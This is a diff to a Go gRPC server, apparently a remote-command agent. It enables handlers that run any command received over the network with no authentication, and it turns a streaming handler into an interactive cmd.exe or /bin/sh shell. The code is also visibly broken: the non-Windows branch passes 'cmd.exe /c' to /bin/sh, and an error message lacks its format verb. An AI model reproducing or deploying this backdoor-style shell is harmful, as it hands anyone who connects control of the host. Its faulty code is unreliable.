@@ -1,16 +1,20 @@
 package main
 
 import (
+	"context"
 	"fmt"
 	"io"
 	"log"
 	"net"
 	"os"
 	"os/exec"
+	"runtime"
+	"strings"
 	"time"
 
 	pb "github.com/bartimus-primed/proto/pb"
 	"google.golang.org/grpc"
+	"google.golang.org/protobuf/types/known/emptypb"
 )
 
 const (
@@ -23,20 +27,20 @@ type server struct {
 }
 
 // SayHello implements helloworld.GreeterServer
-// func (s *server) RunCommandAndRespond(ctx context.Context, in *pb.Command) (*pb.Response, error) {
-// 	log.Printf("Received: %v", in.GetCmd())
-// 	cmd := in.GetCmd()
-// 	out, _ := exec.Command(cmd).Output()
-// 	return &pb.Response{Resp: string(out), Success: true}, nil
-// }
+func (s *server) RunCommandAndRespond(ctx context.Context, in *pb.Command) (*pb.Response, error) {
+	log.Printf("Received in responder: %v", in.GetCmd())
+	cmd := in.GetCmd()
+	out, _ := exec.Command(cmd).Output()
+	return &pb.Response{Resp: string(out), Success: true}, nil
+}
 
-// func (s *server) RunCommand(ctx context.Context, in *pb.Command) (*emptypb.Empty, error) {
-// 	log.Printf("Received: %v", in.GetCmd())
-// 	cmd := in.GetCmd()
-// 	out, _ := exec.Command(cmd).Output()
-// 	fmt.Printf("Running: %s without sending response.", out)
-// 	return &emptypb.Empty{}, nil
-// }
+func (s *server) RunCommand(ctx context.Context, in *pb.Command) (*emptypb.Empty, error) {
+	log.Printf("Received: %v", in.GetCmd())
+	cmd := in.GetCmd()
+	out, _ := exec.Command(cmd).Output()
+	fmt.Printf("Running: %s without sending response.", out)
+	return &emptypb.Empty{}, nil
+}
 
 func (s *server) HandsOn(stream pb.Interact_HandsOnServer) error {
 	for {
@@ -48,15 +52,34 @@ func (s *server) HandsOn(stream pb.Interact_HandsOnServer) error {
 		if err != nil {
 			return err
 		}
-		if in.GetCmd() == "exit" {
+		cmd := strings.Split(in.GetCmd(), " ")
+		if strings.TrimSpace(cmd[0]) == "exit" {
 			fmt.Println("Received kill command")
-			stream.Send(&pb.Response{Resp: "exit", Success: true})
+			stream.Send(&pb.Response{Resp: "exit"})
 			time.Sleep(time.Second * 2)
 			os.Exit(0)
 		}
 		log.Printf("Received: %v", in.GetCmd())
-		cmd := in.GetCmd()
-		out, _ := exec.Command(cmd).Output()
+		cmd_clean := []string{"cmd.exe", "/c"}
+		for _, a := range cmd {
+			cmd_clean = append(cmd_clean, a)
+		}
+		var cmdstruct *exec.Cmd
+		if runtime.GOOS == "windows" {
+			cmdstruct = &exec.Cmd{
+				Path: "cmd.exe",
+				Args: cmd_clean,
+			}
+		} else {
+			cmdstruct = &exec.Cmd{
+				Path: "/bin/sh",
+				Args: cmd_clean,
+			}
+		}
+		out, err := cmdstruct.CombinedOutput()
+		if err != nil {
+			stream.Send(&pb.Response{Resp: fmt.Sprintf("Failed with: ", err), Success: false})
+		}
 		stream.Send(&pb.Response{Resp: string(out), Success: true})
 	}
 }
